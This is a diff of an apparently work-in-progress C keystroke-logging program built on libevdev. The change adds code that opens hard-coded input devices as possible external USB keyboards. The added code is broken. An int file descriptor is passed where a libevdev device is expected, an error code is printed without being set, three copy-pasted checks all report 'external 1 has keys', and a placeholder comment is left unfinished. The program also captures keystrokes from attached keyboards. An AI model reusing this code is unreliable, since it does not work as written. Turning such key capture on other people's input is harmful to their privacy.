@@ -55,8 +55,8 @@ void log_device(key_package* key_package) {
   }
 
   // Use the getter functions to gather info about the device
-  printf("Device: %s | vendor: %x | product: %x\n", libevdev_get_name(dev),
-         libevdev_get_id_vendor(dev), libevdev_get_id_product(dev));
+  // printf("Device: %s | vendor: %x | product: %x\n", libevdev_get_name(dev),
+  //        libevdev_get_id_vendor(dev), libevdev_get_id_product(dev));
 
   // TODO: store this data in a struct
   
@@ -118,8 +118,36 @@ void log_keys(key_package* key_package) {
     exit(0);
   }
 
-  printf("does keyboard have key events? (1 = yes): %d\n",
-         libevdev_has_event_type(keyboard_dev, EV_KEY));
+  // check USB ports in the event they are external keyboards
+  int external1_fd = open("/dev/input/event25", O_RDONLY | O_NONBLOCK);
+  if (external1_fd < 0) {
+    printf("Nothing plugged into bottom right USB (closest to you)\n");
+  }
+  int external2_fd = open("/dev/input/event27", O_RDONLY | O_NONBLOCK);
+  if (external2_fd < 0) {
+    printf("Nothing plugged into left USB\n");
+  }
+  int external3_fd = open("/dev/input/event28", O_RDONLY | O_NONBLOCK);
+  if (external3_fd < 0) {
+    printf("Nothing plugged into top right USB\n");
+  }
+
+  // convert all to _____
+  if (libevdev_new_from_fd(external1_fd, &keyboard_dev) < 0) {
+    fprintf(stderr, "error with setting rc: %d %s\n", -rc, strerror(-rc));
+    fclose(data_storage);
+    exit(0);
+  }
+
+  if (libevdev_has_event_type(external1_fd, EV_KEY) == 1) {
+    printf("external 1 has keys\n");
+  }
+  if (libevdev_has_event_type(keyboard_dev, EV_KEY) == 1) {
+    printf("external 1 has keys\n");
+  }
+  if (libevdev_has_event_type(keyboard_dev, EV_KEY) == 1) {
+    printf("external 1 has keys\n");
+  }
 
   while (1) {
     struct input_event ev;
@@ -197,7 +225,6 @@ void log_keys(key_package* key_package) {
       for (size_t i = 0; i < key_package->keys_arr_size; i++) {
         printf("%s  ", key_package->keys[i].key);
       }
-      printf("\n");
 
       exit(1);
     }
